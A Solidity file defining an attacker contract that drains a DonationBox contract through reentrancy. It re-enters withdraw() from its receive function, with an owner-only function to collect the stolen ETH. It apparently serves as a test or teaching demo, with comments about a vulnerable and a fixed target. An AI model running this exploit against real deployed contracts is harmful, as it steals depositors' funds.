// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title Attacker
/// @notice Attacks DonationBox contracts by re-entering withdraw() in fallback
contract Attacker {
    address public target;
    address public owner;
    uint256 public attackCount;

    constructor(address _target) {
        target = _target;
        owner = msg.sender;
    }

    /// @notice Kick off the attack:
    /// 1) deposit a small amount into the DonationBox as attacker
    /// 2) call withdraw() to trigger the external transfer which invokes fallback -> reenter
    function attack() external payable {
        require(msg.value >= 0.001 ether, "provide some ETH to deposit");
        // Try deposit() first (for vulnerable contract), then donate() (for fixed contract)
        (bool ok, ) = address(target).call{value: msg.value}(abi.encodeWithSignature("deposit()"));
        if (!ok) {
            (ok, ) = address(target).call{value: msg.value}(abi.encodeWithSignature("donate()"));
        }
        require(ok, "deposit/donate failed");

        // Start the withdraw that will be re-entered via fallback
        (bool success, ) = target.call(abi.encodeWithSignature("withdraw()"));
        require(success, "withdraw failed");

        // Keep funds in contract for testing purposes
        // payable(owner).transfer(address(this).balance);
    }

    /// @notice fallback is triggered when receiving Ether. Re-enter withdraw() while the target still has funds
    receive() external payable {
        // stop after some iterations or if target has no balance left
        uint256 targetBal = address(target).balance;

        // Prevent infinite loop: limit re-entries (you can tune this)
        if (targetBal > 0 && attackCount < 50) {
            attackCount++;
            // Re-enter target to withdraw again before its state was set to zero
            target.call(abi.encodeWithSignature("withdraw()"));
        }
    }

    // Helper to retrieve any stuck funds
    function collect() external {
        require(msg.sender == owner, "only owner");
        payable(owner).transfer(address(this).balance);
    }
}
